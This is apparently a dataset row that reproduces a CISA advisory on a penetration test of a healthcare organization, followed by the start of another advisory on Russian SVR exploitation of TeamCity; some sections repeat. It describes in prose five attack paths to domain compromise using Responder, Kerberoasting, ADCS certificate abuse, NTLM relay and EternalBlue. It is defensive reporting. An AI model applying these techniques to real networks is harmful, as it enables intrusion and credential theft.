Poor Credential Hygiene: Password Reuse for Administrator Accounts


Discontinue reuse or sharing of administrative credentials among systems [CPG 2.C]. When possible, use unique credentials across all workstations in accordance with applicable federal standards, industry best practices, and/or agency-defined requirements.
Implement a security awareness program that focuses on the methods commonly used in intrusions that can be blocked through individual action [CPG 2.I].
Implement Local Administrator Password Solution (LAPS) where possible if your OS is older than Windows Server 2019 and Windows 10 as these versions do not have LAPS built in. Note: The authoring organizations recommend organizations upgrade to Windows Server 2019 and Windows 10 or greater.




Poor Patch Management: Out-of-Date Software


Enforce consistent patch management across all systems and hosts within the network environment [CPG 1.E].
Where patching is not possible due to limitations, implement network segregation controls [CPG 2.F] to limit exposure of the vulnerable system or host.
Consider deploying automated patch management tools and software update tools for operating system and software/applications on all systems for which such tools are available and safe.




Poor Patch Management: Unsupported OS or Application


Evaluate the use of unsupported hardware and software and discontinue where possible. If discontinuing the use of unsupported hardware and software is not possible, implement additional network protections to mitigate the risk.




Use of Weak Authentication Measures


Require phishing-resistant MFA for all user accounts that have access to sensitive data or systems. If MFA is not possible, it is recommended to, at a minimum, configure a more secure password policy by aligning with guidelines put forth by trusted entities such as NIST [CPG 2.H].




PII Disclosure


Implement a process to review files and systems for insecure handling of PII [CPG 2.L]. Properly secure or remove the information. Conduct periodic scans of server machines using automated tools to determine whether sensitive data (e.g., personally identifiable information, health, credit card, or classified information) is present on the system in cleartext.
Encrypt PII and other sensitive data, and train users who handle sensitive data to utilize best practices for encrypting data and storing it securely. If sensitive data must be stored on shares or other locations, restrict access to these locations as much as possible through access controls and network segmentation [CPG 2.F, 2.K, 2.L].




Hosts with Unconstrained Delegation Enabled Unnecessarily


Remove Unconstrained Delegation from all servers. If Unconstrained Delegation functionality is required, upgrade operating systems and applications to leverage other approaches (e.g., configure Constrained Delegation, enable the Account is sensitive and cannot be delegated option) or explore whether systems can be retired or further isolated from the enterprise. CISA recommends Windows Server 2019 or greater.




Cleartext Password Disclosure


Implement a review process for files and systems to look for cleartext account credentials. When credentials are found, remove or change them to maintain security [CPG 2.L].
Conduct periodic scans of server machines using automated tools to determine whether sensitive data (e.g., personally identifiable information, health, credit card, or classified information) is present on the system in cleartext. Consider implementing a secure password manager solution in cases where passwords need to be stored [CPG 2.L].




Insecure File Shares


Restrict access to file shares containing sensitive data to only certain authenticated and authorized users [CPG 2.L].





Additionally, CISA recommends that HPH sector organizations implement the following strategies to mitigate cyber threats:

Mitigation Strategy #1 Asset Management and Security:

CISA recommends that HPH sector organizations implement and maintain an asset management policy to reduce the risk of exposing vulnerabilities, devices, or services that could be exploited by threat actors to gain unauthorized access, steal sensitive data, or disrupt critical services. The focus areas for this mitigation strategy include asset management and asset security, addressing asset inventory, procurement, decommissioning, and network segmentation as they relate to hardware, software, and data assets.


Mitigation Strategy #2 Identity Management and Device Security:

CISA recommends entities secure their devices and digital accounts and manage their online access to protect sensitive data and PII/PHI from compromise. The focus areas for this mitigation strategy include email security, phising prevention, access management, password policies, data protection and loss prevention, and device logs and monitoring solutions.


Mitigation Strategy #3 Vulnerability, Patch, and Configuration Management:

CISA recommends entities mitigate known vulnerabilities and establish secure configuration baselines to reduce the likelihood of threat actors exploiting known vulnerabilities to breach organizational networks. The focus areas for this mitigation strategy include vulnerability and patch Management, and configuration and change management.



For more information on these mitigations strategies, see CISA’s Healthcare and Public Health Sector webpage.
Software Manufacturers
The above mitigations apply to HPH sector and other critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws, and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team:

Embed security into product architecture throughout the entire software development lifecycle (SDLC).
Eliminate default passwords. Do not provide software with default passwords. To eliminate default passwords, require administrators set a “strong” password [CPG 2.B] during installation and configuration.
Create secure configuration templates. Provide configuration templates with certain safe settings based on an organization’s risk appetite (e.g., low, medium, and high security templates). Support these templates with hardening guides based on the risks the manufacturer has identified. The default configuration should be a secure one, and organizations should need to opt in if they desire a less secure configuration.
Design products so that the compromise of a single security control does not result in compromise of the entire system. For example, narrowly provision user privileges by default and employ ACLs to reduce the impact of a compromised account. This will make it more difficult for a malicious cyber actor to escalate privileges and move laterally.
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature.

These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.
For more information on secure by design, see CISA’s Secure by Design webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see the joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations.
VALIDATE SECURITY CONTROLS
In addition to applying the listed mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 7 – 16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

For consolidated findings from the RVAs by Fiscal Year mapped to MITRE ATT&CK, see CISA’s Risk and Vulnerability Assessments page.
See joint CSA NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations for information on the most common cybersecurity misconfigurations in large organizations and TTPs actors use to exploit these misconfigurations.
See CISA’s Healthcare and Public Health Sector webpage.
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s RedEye tool overview video for more information.

REFERENCES
[1]   Github | kgretzky / evilginx[2]   Github | lgandx / Responder[3]   Network security LAN Manager authentication level - Windows Security | Microsoft Learn[4]   Service principal names - Win32 apps | Microsoft Learn[5]   Github | fortra / impacket6]   Github | byt3bl33d3r / CrackMapExec[7]   Github | ly4k / Certipy[8]   Github | topotam / PetitPotam[9]   Github | fortra / impacket / examples[10] Github | login-securite / DonPAPI[11] SP 800-63B, Digital Identity Guidelines: Authentication and Lifecycle Management | CSRC (nist.gov)
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES

Table 7: CISA Team ATT&CK Techniques for Reconnaissance


Reconnaissance
 
 


Technique Title
ID
Use




Active Scanning: Scanning IP Blocks
T1595.001
The CISA team first mapped the network to identify open web ports.




Table 8: CISA Team ATT&CK Techniques for Initial Access


Initial Access
 
 




Technique Title
ID
Use


Valid Accounts: Default Accounts
T1078.001
The CISA team did identify default credentials for multiple web interfaces during web application testing and used default printer credentials while penetration testing.


External Remote Services
T1133
The CISA team attempted to access various web interfaces with default administrator credentials.




Table 9: CISA Team ATT&CK Techniques for Execution


Execution
 
 


Technique Title
ID
Use




Command-Line Interface
T1059
The CISA team accessed a virtual machine interface enabling them to modify, power off, and/or delete critical virtual machines including domain controllers, file servers, and servers.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
The CISA team used a webshell that allowed them to execute commands under the context of the local SYSTEM account.




Table 10: CISA Team ATT&CK Techniques for Privilege Escalation


Privilege Escalation
 
 


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
The CISA team used CrackMapExec to use ACCOUNT 1 to successfully connect to a domain controller (DC).




Table 11: CISA Team ATT&CK Techniques for Defense Evasion


Defense Evasion
 
 


Technique Title
ID
Use




Use Alternate Authentication Material
T1550
The CISA team authenticated to the domain controller as ACCOUNT 3 with the generated certificate.




Table 12: CISA Team ATT&CK Techniques for Credential Access


Credential Access
 
 


Technique Title
ID
Use




LLMNR/NBT-NS Poisoning and Relay
T1557.001
The CISA team initiated a LLMNR/NBT-NS/mDNS/DHCP poisoning tool to spoof a connection to the organization’s server for forced access.


Brute Force: Password Cracking
T1110.002
The CISA team cracked a service account with a weak password, giving them access to it.


Steal or Forge Kerberos Tickets: Kerberoasting
T1558.003
The CISA team gained access to domain accounts because any domain user can request a TGS ticket for domain accounts.


Adversary-in-the-Middle
T1557
The CISA team modified the “Save as file” configuration, to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and changed the Server Name and Network Path to point to a CISA-controlled machine running Responder.


Forced Authentication
T1187
The CISA team executed a “Connection Test” that sent the username and password over FTP.


Steal or Forge Authentication Certificates
T1649
The CISA team used Certipy to enumerate the ADCS certificate template vulnerabilities, allowing them to obtain certificates for different users.


OS Credential Dumping
T1003
The CISA team retrieved the NTLM hash for ACCOUNT 3.


Use Alternate Authentication Material: Pass the Hash
T1550.002
The CISA team used the hash to authenticate to the domain controller and validated Domain Administrator privileges, demonstrating compromise of the domain.


Brute Force: Password Spraying
T1110.003
The CISA team used a tool called CrackMapExec to spray easily guessable passwords across all domain accounts, giving them two sets of valid credentials.


Steal or Forge Kerberos Tickets
T1558
The CISA team used this certificate to acquire a TGT for ACCOUNT 5.


OS Credential Dumping: DCSync
T1003.006
The CISA team used DCSync to dump the NTLM hash for ACCOUNT 3 (a Domain Administrator account), effectively leading to domain compromise.


OS Credential Dumping: Security Account Manager
T1003.002
The CISA team dumped password hashes from a Security Account Manager (SAM) database.




Table 13: CISA Team ATT&CK Techniques for Discovery


Discovery
 
 


Technique Title
ID
Use




Network Sniffing
T1040
The CISA team spoofed a response to direct the victim host to a CISA-controlled machine on which Responder is running. 


Account Discovery: Domain Account
T1087.002
The CISA team enumerated accounts with a Service Principal Name (SPN) set with their domain access.


Network Service Scanning
T1046
The CISA team canned the organization’s network to identify open web ports to see where they could leverage the default credentials they had.




Table 14: CISA Team ATT&CK Techniques for Lateral Movement


Lateral Movement
 
 


Technique Title
ID
Use




Remote Services
T1021
The CISA team exploited its Responder to perform malicious functions, such as stealing credentials or opening a session on a targeted host.


 SMB/Windows Admin Shares
T1021.002
The CISA team confirmed they compromised the domain because ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share.


Taint Shared Content
T1080
The CISA team found the device was configured with domain credentials to allow employees to save scanned documents to a network share.


Exploitation of Remote Services
T1210
The CISA team then executed a well-known EternalBlue exploit and established a shell on the server.




Table 15: CISA Team ATT&CK Techniques for Collection


Collection
 
 


Technique Title
ID
Use




Data from Network Shared Drive
T1039
The CISA team obtained credentials for cleartext, hashes, and from files.




Table 16: CISA Team ATT&CK Techniques for Impact


Collection
 
 


Technique Title
ID
Use




System Shutdown/Reboot
T1529
The CISA team assessed that with ACCOUNT 1, they could use it to modify, power off, and/or delete critical virtual machines, including domain controllers and file servers.



VERSION HISTORY
December 14, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1003.002', 'T1021.002', 'T1558.003', 'T1529', 'T1040', 'T1210', 'T1087.002', 'T1110.002', 'T1021', 'T1595.001', 'T1557', 'T1550.002', 'T1110.003', 'T1080', 'T1078.002', 'T1550', 'T1039', 'T1003', 'T1046', 'T1133', 'T1003.006', 'T1558', 'T1059', 'T1187', 'T1557.001', 'T1649', 'T1078.001', 'T1059.003'}","






Actions to take today to harden your internal environment to mitigate follow-on activity after initial access.




Use phishing-resistant multi-factor authentication (MFA) for all administrative access.
Verify the implementation of appropriate hardening measures, and change, remove, or deactivate all default credentials.
Implement network segregation controls.







SUMMARY
In January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) conducted a Risk and Vulnerability Assessment (RVA) at the request of a Healthcare and Public Health (HPH) sector organization to identify vulnerabilities and areas for improvement. An RVA is a two-week penetration test of an entire organization, with one week spent on external testing and one week spent assessing the internal network. As part of the RVA, the CISA assessment team conducted web application, phishing, penetration, database, and wireless assessments. The assessed organization was a large organization deploying on-premises software.
During the one-week external assessment, the assessment team did not identify any significant or exploitable conditions in externally available systems that may allow a malicious actor to easily obtain initial access to the organization’s network. Furthermore, the assessment team was unable to gain initial access to the assessed organization through phishing. However, during internal penetration testing, the team exploited misconfigurations, weak passwords, and other issues through multiple attack paths to compromise the organization’s domain.
In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) detailing the RVA team’s activities and key findings to provide network defenders and software manufacturers recommendations for improving their organizations’ and customers’ cyber posture, which reduces the impact of follow-on activity after initial access. CISA encourages the HPH sector and other critical infrastructure organizations deploying on-premises software, as well as software manufacturers, to apply the recommendations in the Mitigations section of this CSA to harden networks against malicious activity and to reduce the likelihood of domain compromise.
Download the PDF version of this report:


AA23-349A Enhancing Cyber Resilience: Insights from the CISA Healthcare and Public Health Sector Risk and Vulnerability Assessment
(PDF,       744.23 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for tables of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Introduction
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to federal and non-federal entities with respect to cybersecurity risks. See generally 6 U.S.C. §§ 652(c)(5), 659(c)(6). After receiving a request for an RVA from the organization and coordinating high-level details of the engagement with certain personnel at the organization, CISA conducted the RVA in January 2023.
During RVAs, CISA tests the security posture of an organization’s network over a two-week period to determine the risk, vulnerability, and exploitability of systems and networks. During the first week (the external phase), the team tests public facing systems to identify exploitable vulnerabilities. During the second week (the internal phase), the team determines the susceptibility of the environment to an actor with internal access (e.g., malicious cyber actor or insider threat). The assessment team offers five services:

Web Application Assessment: The assessment team uses commercial and open source tools to identify vulnerabilities in public-facing and internal web applications, demonstrating how they could be exploited.
Phishing Assessment: The assessment team tests the susceptibility of staff and infrastructure to phishing attacks and determines what impact a phished user workstation could have on the internal network. The RVA team crafts compelling email pretexts and generates payloads, similar to ones used by threat actors, in order to provide a realistic threat perspective to the organization.
Penetration Testing: The assessment team tests the security of an environment by simulating scenarios an advanced cyber actor may attempt. The team’s goals are to establish a foothold, escalate privileges, and compromise the domain. The RVA team leverages both open source and commercial tools for host discovery, port and service mapping, vulnerability discovery and analysis, and vulnerability exploitation.
Database Assessment: The assessment team uses commercial database tools to review databases for misconfigurations and missing patches.
Wireless Assessment: The assessment team uses specialized wireless hardware to assess wireless access points, connected endpoints, and user awareness for vulnerabilities.

The assessed organization was in the HPH sector. See Table 1 for services in-scope for this RVA.

Phase I: External Assessment
Penetration and Web Application Testing
The CISA team did not identify any significant or exploitable conditions from penetration or web application testing that may allow a malicious actor to easily obtain initial access to the organization’s network.
Phishing Assessment
The CISA team conducted phishing assessments that included both user and systems testing.
The team’s phishing assessment was unsuccessful because the organization’s defensive tools blocked the execution of the team’s payloads. The payload testing resulted in most of the team’s payloads being blocked by host-based protections through a combination of browser, policy, and antivirus software. Some of the payloads were successfully downloaded to disk without being immediately removed, but upon execution, the antivirus software detected the malicious code and blocked it from running. Some payloads appeared to successfully evade host-based protections but did not create a connection to the command and control (C2) infrastructure, indicating they may have been incompatible with the system or blocked by border protections.
Since none of the payloads successfully connected to the assessment team’s C2 server, the team conducted a credential harvesting phishing campaign. Users were prompted to follow a malicious link within a phishing email under the pretext of verifying tax information and were then taken to a fake login form.
While twelve unique users from the organization submitted credentials through the malicious form, the CISA team was unable to leverage the credentials because they had limited access to external-facing resources. Additionally, the organization had multi-factor authentication (MFA) implemented for cloud accounts. Note: At the time of the assessment, the CISA team’s operating procedures did not include certain machine-in-the-middle attacks that could have circumvented the form of MFA in place. However, it is important to note that tools like Evilginx,1, can be leveraged to bypass non-phishing resistant forms of MFA. Furthermore, if a user executes a malicious file, opening a connection to a malicious actor’s command and control server, MFA will not prevent the actor from executing commands and carrying out actions under the context of that user.
Phase II: Internal Assessment
Database, Web Application, and Wireless Testing
The CISA assessment team did not identify any significant or exploitable conditions from database or wireless testing that may allow a malicious actor to easily compromise the confidentiality, integrity, and availability of the tested environment.
The team did identify default credentials, for multiple web interfaces during web application testing and used default printer credentials while penetration testing. (See the Attack Path 2 section for more information.)
Penetration Testing
The assessment team starts internal penetration testing with a connection to the organization’s network but without a valid domain account. The team’s goal is to compromise the domain by gaining domain admin or enterprise administrator-level permissions. Generally, the team first attempts to gain domain user access and then escalate privileges until the domain is compromised. This process is called the “attack path”—acquiring initial access to an organization and escalating privileges until the domain is compromised and/or vital assets for the organization are accessed. The attack path requires specialized expertise and is realistic to what adversaries may do in an environment.
For this assessment, the team compromised the organization’s domain through four unique attack paths, and in a fifth attack path the team obtained access to sensitive information.
See the sections below for a description of the team’s attack paths mapped to the MITRE ATT&CK for Enterprise framework. See the Findings section for information on issues that enabled the team to compromise the domain.
Attack Path 1
The assessment team initiated LLMNR/NBT-NS/mDNS/DHCP poisoning, with Responder,2, which works in two steps:

Responder listens to multicast name resolution queries (e.g., LLMNR UDP/5355, NBTNS UDP/137), and under the right conditions spoofs a response to direct the victim host to a CISA-controlled machine on which Responder is running.
Once a victim connects to the machine, Responder exploits the connection to perform malicious functions such as stealing credentials or opening a session on a targeted host,.

With this tool, the CISA team captured fifty-five New Technology Local Area Network Manager version 2 (NTLMv2) hashes, including the NTLMv2 hash for a service account. Note: NTLMv2 and other variations of the hash protocol are used for clients to join a domain, authenticate between Active Directory forests, authenticate between earlier versions of Windows operating systems (OSs), and authenticate computers that are not normally a part of the domain.,3, Cracking these passwords may enable malicious actors to establish a foothold in the domain and move laterally or elevate their privileges if the hash belongs to a privileged account.
The service account had a weak password, allowing the team to quickly crack it, and obtain access to the organization’s domain. With domain access, the CISA assessment team enumerated accounts with a Service Principal Name (SPN) set,. SPN is the unique service identifier used by Kerberos authentication,4, and accounts with SPN are susceptible to Kerberoasting.
The CISA team used Impacket’s,5, GetUserSPNs tool to request Ticket-Granting Service (TGS) tickets for all accounts with SPN set and obtained their Kerberos hashes,. Three of these accounts had domain administrator privileges—offline, the team cracked ACCOUNT 1 (which had a weak password).
Using CrackMapExec,6, the assessment team used ACCOUNT 1, to successfully connect to a domain controller (DC). The team confirmed they compromised the domain because ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share, (see Figure 1).

 

Figure 1: ACCOUNT 1 Domain Admin Privileges

To further demonstrate the impact of compromising ACCOUNT 1, the assessment team used it to access a virtual machine interface. If a malicious actor compromised ACCOUNT 1, they could use it to modify, power off, and/or delete critical virtual machines, including domain controllers and file servers.
Attack Path 2
The team first mapped the network to identify open web ports, and then attempted to access various web interfaces, with default administrator credentials. The CISA team was able to log into a printer interface with a default password and found the device was configured with domain credentials to allow employees to save scanned documents to a network share,.
While logged into the printer interface as an administrator, the team 1) modified the “Save as file” configuration to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and 2) changed the Server Name and Network Path to point to a CISA-controlled machine running Responder,. Then, the team executed a “Connection Test” that sent the username and password over FTP, to the CISA machine running Responder, which captured cleartext credentials for a non-privileged domain account (ACCOUNT 2).
Using ACCOUNT 2 and Certipy,7, the team enumerated potential certificate template vulnerabilities found in Active Directory Certificate Services (ADCS). Note: ADCS templates are used to build certificates for different types of servers and other entities on an organization’s network. Malicious actors can exploit template misconfigurations, to manipulate the certificate infrastructure into issuing fraudulent certificates and/or escalate user privileges to a domain administrator.
The WebServer template was misconfigured to allow all authenticated users permission to:

Change the properties of the template (via Object Control Permissions with Write Property Principals set to Authenticated Users).
Enroll for the certificate (via Enrollment Permissions including the Authenticated Users group).
Request a certificate for a different user (via EnrolleeSuppliesSubject set as True).

See Figure 2 for the displayed certificate template misconfigurations.

 


The template’s Client Authentication was set to False, preventing the CISA assessment team from requesting a certificate that could be used to authenticate to a server in the domain. To demonstrate how this misconfiguration could lead to privilege escalation, the assessment team, leveraging its status as a mere authenticated user, briefly changed the WebServer template properties to set Client Authentication to True so that a certificate could be obtained for server authentication, ensuring the property was set back to its original setting of False immediately thereafter.
The team used Certipy with the ACCOUNT 2 credentials to request a certificate for a Domain Administrator account (ACCOUNT 3). The team then authenticated to the domain controller as ACCOUNT 3 with the generated certificate, and retrieved the NTLM hash for ACCOUNT 3,. The team used the hash to authenticate to the domain controller, and validated Domain Administrator privileges, demonstrating compromise of the domain via the WebServer template misconfiguration.
Attack Path 3
The CISA team used a tool called CrackMapExec to spray easily guessable passwords, across all domain accounts and obtained two sets of valid credentials for standard domain user accounts.
The assessment team leveraged one of the domain user accounts (ACCOUNT 4) to enumerate ADCS via Certipy and found that web enrollment was enabled (see Figure 3). If web enrollment is enabled, malicious actors can abuse certain services and/or misconfigurations in the environment to coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to the ADCS web enrollment service and obtain a certificate for the server’s account (known as a relay attack).

 

Figure 3: Misconfigured ADCS Enumerated via Certipy

The team used PetitPotam,8, with ACCOUNT 4 credentials to force the organization’s domain controller to authenticate to the CISA-operated machine and then used Certipy to relay the coerced authentication attempt to the ADCS web enrollment service to receive a valid certificate for ACCOUNT 5, the domain controller machine account. They used this certificate to acquire a TGT, for ACCOUNT 5.
With the TGT for ACCOUNT 5, the CISA team used DCSync to dump the NTLM hash, for ACCOUNT 3 (a Domain Administrator account,see Attack Path 2 section,), effectively leading to domain compromise.
Attack Path 4
The CISA team identified several systems on the organization’s network that do not enforce SMB signing. The team exploited this misconfiguration to obtain cleartext credentials for two domain administrator accounts.
First, the team used Responder to capture the NTLMv2 hash for a domain administrator account. Next, they used Impacket’s NTLMrelayx tool,9, to relay the authentication for the domain administrator, opening a SOCKS connection on a host that did not enforce SMB signing. The team then used DonPAPI,10, to dump cleartext credentials through the SOCKS connection and obtained credentials for two additional domain administrator accounts.
The CISA team validated the privileges of these accounts by checking for READ,WRITE access on a domain controller C$ share, demonstrating Domain Administrator access and therefore domain compromise.
Attack Path 5
The team did vulnerability scanning, and identified a server vulnerable to CVE-2017-0144 (an Improper Input Validation,CWE-20, vulnerability known as “EternalBlue” that affects SMB version 1,SMBv1, and enables remote code execution,see Figure 4,).

 

Figure 4: Checking for EternalBlue Vulnerability

The CISA assessment team then executed a well-known EternalBlue exploit, and established a shell on the server. This shell allowed them to execute commands, under the context of the local SYSTEM account.
With this local SYSTEM account, CISA dumped password hashes from a Security Account Manager (SAM) database,. The team parsed the hashes and identified one for a local administrator account. Upon parsing the contents of the SAM database dump, the CISA team identified an NTLM hash for the local administrator account, which can be used to authenticate to various services.
The team sprayed the acquired NTLM hash across a network segment and identified multiple instances of password reuse allowing the team to access various resources including sensitive information with the hash.
Findings
Key Issues
The CISA assessments team identified several findings as potentially exploitable vulnerabilities that could compromise the confidentiality, integrity, and availability of the tested environment. Each finding, listed below, includes a description with supporting details. See the Mitigations section for recommendations on how to mitigate these issues.
The CISA team rated their findings on a severity scale from critical to informational (see Table 2).

The CISA assessment team identified four High severity vulnerabilities and one Medium severity vulnerability during penetration testing that contributed to the team’s ability to compromise the domain. See Table 3 for a list and description of these findings.

In addition to the issues listed above, the team identified three High and seven Medium severity findings. These vulnerabilities and misconfigurations may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment. See Table 4 for a list and description of these findings.

Additional Issues
The CISA team identified one Informational severity within the organization’s networks and systems. These issues may allow a malicious actor to compromise the confidentiality, integrity, and availability of the tested environment, but are not readily exploitable. The information provided is to encourage the stakeholder to investigate these issues further to adjust their environments or eliminate certain aspects as needed, but the urgency is low.

Noted Strengths
The CISA team noted the following business, technical, and administrative components that enhanced the network security posture of the tested environment:

The organization’s network was found to have several strong, security-oriented characteristics such as:

Effective antivirus software;
Endpoint detection and response capabilities;
Good policies and best practices for protecting users from malicious files including not allowing users to mount ISO files;
Minimal external attack surface, limiting an adversary’s ability to leverage external vulnerabilities to gain initial access to the organization’s networks and systems;
Strong wireless protocols;
And network segmentation.


The organization’s security also demonstrated their ability to detect some of the CISA team's actions throughout testing and overall situational awareness through the use of logs and alerts.
The organization used MFA for cloud accounts. The assessment team obtained cloud credentials via a phishing campaign but was unable to use them because of MFA prompts.

MITIGATIONS
Network Defenders
CISA recommends HPH Sector and other critical infrastructure organizations implement the mitigations in Table 6 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Additionally, CISA recommends that HPH sector organizations implement the following strategies to mitigate cyber threats:

Mitigation Strategy #1 Asset Management and Security:

CISA recommends that HPH sector organizations implement and maintain an asset management policy to reduce the risk of exposing vulnerabilities, devices, or services that could be exploited by threat actors to gain unauthorized access, steal sensitive data, or disrupt critical services. The focus areas for this mitigation strategy include asset management and asset security, addressing asset inventory, procurement, decommissioning, and network segmentation as they relate to hardware, software, and data assets.


Mitigation Strategy #2 Identity Management and Device Security:

CISA recommends entities secure their devices and digital accounts and manage their online access to protect sensitive data and PII/PHI from compromise. The focus areas for this mitigation strategy include email security, phising prevention, access management, password policies, data protection and loss prevention, and device logs and monitoring solutions.


Mitigation Strategy #3 Vulnerability, Patch, and Configuration Management:

CISA recommends entities mitigate known vulnerabilities and establish secure configuration baselines to reduce the likelihood of threat actors exploiting known vulnerabilities to breach organizational networks. The focus areas for this mitigation strategy include vulnerability and patch Management, and configuration and change management.



For more information on these mitigations strategies, see CISA’s Healthcare and Public Health Sector webpage.
Software Manufacturers
The above mitigations apply to HPH sector and other critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws, and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team:

Embed security into product architecture throughout the entire software development lifecycle (SDLC).
Eliminate default passwords. Do not provide software with default passwords. To eliminate default passwords, require administrators set a “strong” password,CPG 2.B, during installation and configuration.
Create secure configuration templates. Provide configuration templates with certain safe settings based on an organization’s risk appetite (e.g., low, medium, and high security templates). Support these templates with hardening guides based on the risks the manufacturer has identified. The default configuration should be a secure one, and organizations should need to opt in if they desire a less secure configuration.
Design products so that the compromise of a single security control does not result in compromise of the entire system. For example, narrowly provision user privileges by default and employ ACLs to reduce the impact of a compromised account. This will make it more difficult for a malicious cyber actor to escalate privileges and move laterally.
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature.

These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.
For more information on secure by design, see CISA’s Secure by Design webpage. For more information on common misconfigurations and guidance on reducing their prevalence, see the joint advisory NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations.
VALIDATE SECURITY CONTROLS
In addition to applying the listed mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 7 – 16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

For consolidated findings from the RVAs by Fiscal Year mapped to MITRE ATT&CK, see CISA’s Risk and Vulnerability Assessments page.
See joint CSA NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations for information on the most common cybersecurity misconfigurations in large organizations and TTPs actors use to exploit these misconfigurations.
See CISA’s Healthcare and Public Health Sector webpage.
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s RedEye tool overview video for more information.

REFERENCES,1,   Github | kgretzky / evilginx,2,   Github | lgandx / Responder,3,   Network security LAN Manager authentication level - Windows Security | Microsoft Learn,4,   Service principal names - Win32 apps | Microsoft Learn,5,   Github | fortra / impacket6,   Github | byt3bl33d3r / CrackMapExec,7,   Github | ly4k / Certipy,8,   Github | topotam / PetitPotam,9,   Github | fortra / impacket / examples,10, Github | login-securite / DonPAPI,11, SP 800-63B, Digital Identity Guidelines: Authentication and Lifecycle Management | CSRC (nist.gov)
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES










VERSION HISTORY
December 14, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-349a
8,"



SUMMARY
The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.
